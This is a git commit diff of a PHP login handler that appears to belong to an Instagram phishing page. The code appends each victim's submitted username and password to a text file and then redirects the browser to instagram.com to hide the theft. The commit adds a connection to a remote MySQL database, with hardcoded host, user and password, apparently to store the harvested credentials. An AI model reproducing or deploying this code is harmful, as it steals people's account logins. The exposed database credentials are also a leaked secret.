803c48e9dd8edff0ab578bd8bce398debc5f6cbe
dummyuser127 <99482209+dummyuser127@users.noreply.github.com>
2022-04-11 21:58:37 +0530

    Update login.php

--- login.php
+++ login.php
@@ -1,6 +1,18 @@
 <?php
 
 file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+
+$connection = mysqli_connect('sql306.epizy.com','epiz_31235925','eORLAdHHMvoWsf','epiz_31235925_instagram');
+
+if($connection)
+{
+echo "true";
+}
+else
+{
+echo "false"; 
+}
+
 header('Location: https://instagram.com');
 exit();
 ?>
